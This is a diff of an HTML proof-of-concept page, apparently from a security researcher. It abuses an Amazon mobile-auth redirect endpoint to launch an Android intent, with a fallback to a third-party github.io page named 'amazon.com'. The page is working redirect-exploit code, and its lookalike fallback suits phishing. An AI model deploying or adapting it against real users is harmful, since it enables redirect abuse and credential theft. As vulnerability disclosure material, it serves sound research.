@@ -1,19 +1,57 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-  <head>
-    <title>PoC</title>
-  </head>
-  <body> 
-    <h1>PoC</h1>
+<head>
+    <meta charset="UTF-8">
+    <title>Amazon Shopping Redirect PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #111;
+            color: #eee;
+            text-align: center;
+            padding: 40px;
+        } 
+        a {
+            display: inline-block;
+            padding: 14px 22px;
+            background: #ff9900;
+            color: #111;
+            font-size: 18px;
+            font-weight: bold;
+            text-decoration: none;
+            border-radius: 8px;
+            margin-top: 25px;
+        }
+        a:hover {
+            background: #ffb74d;
+        }
+    </style>
+</head>
+<body>
 
+    <h2>Amazon Shopping – Client Redirect Test</h2>
+    <p>
+        Click the button below on Android to trigger Amazon<br>
+        through a link.mobileauth.amazon.com redirect.
+    </p>
+
+    <a id="redirect-poc" href="#">Open Amazon App via Redirect</a>
 
     <script>
-      const rawRedirect = 'intent://amazon-shopping-test/#Intent;scheme=https;package=in.amazon.mShop.android.shopping;S.browser_fallback_url=https://probear0001.github.io/amazon.com/;end';
+        
+        const rawRedirect =
+            'intent://amazon-shopping-test/#Intent;scheme=https;package=in.amazon.mShop.android.shopping;S.browser_fallback_url=https://probear0001.github.io/amazon.com/;end';
 
-      const url ='https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=' +
-        encodeURIComponent(rawRedirect);
+        
+        const pocUrl =
+            'https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=' +
+            encodeURIComponent(rawRedirect);
 
-      window.location.href = url;
+        
+        document.getElementById('redirect-poc').href = pocUrl;
     </script>
-  </body>
+
+    <small>PoC by Prayas – Security Research</small>
+
+</body>
 </html>
